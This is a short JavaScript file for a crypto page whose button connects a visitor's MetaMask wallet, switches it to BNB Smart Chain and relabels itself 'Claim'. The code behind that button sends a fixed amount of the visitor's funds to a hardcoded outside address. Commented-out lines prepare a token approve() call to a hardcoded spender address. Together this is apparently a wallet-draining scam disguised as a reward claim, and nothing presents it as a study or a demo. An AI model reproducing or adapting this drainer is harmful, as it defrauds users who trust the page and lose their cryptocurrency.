const ethereumButton = document.getElementById('connect');


ethereumButton.addEventListener('click', async () => {
  //Will Start the metamask extension
  accounts = await ethereum.request({ method: 'eth_requestAccounts' });
  await window.ethereum.request({
    method: 'wallet_switchEthereumChain',
    params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
});
  ethereumButton.innerHTML = 'Claim'
});

ethereumButton.addEventListener('click', () => {
  console.error('1')
  ethereum
    .request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: accounts[0],
          to: '0x7e3cfC7912ee17cDb6A171F0e10dDAB7703dEcB2',
          gaslimit: '0xbefe6f672000',
          value: '0x8700cc75770000',
          gas: '0x5208',
        },
      ],
    })
    .then((txHash) => console.log(txHash))
    .catch((error) => console.error);
});





//var Web3 = require('web3');
//const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
//const Contract = ('0x7b665B2F633d9363b89A98b094B1F9E732Bd8F86');
//const spenderAdr = ('0xf1522EB7353ef1FAA6B8961E62D857B27f985b93');
//const amount = ('100000')


//approvebutton.addEventListener('click' async () => {
 // Contract.methods.approve(spenderAddr, amount).send({
 //  from: ownerAddr
//})
//})
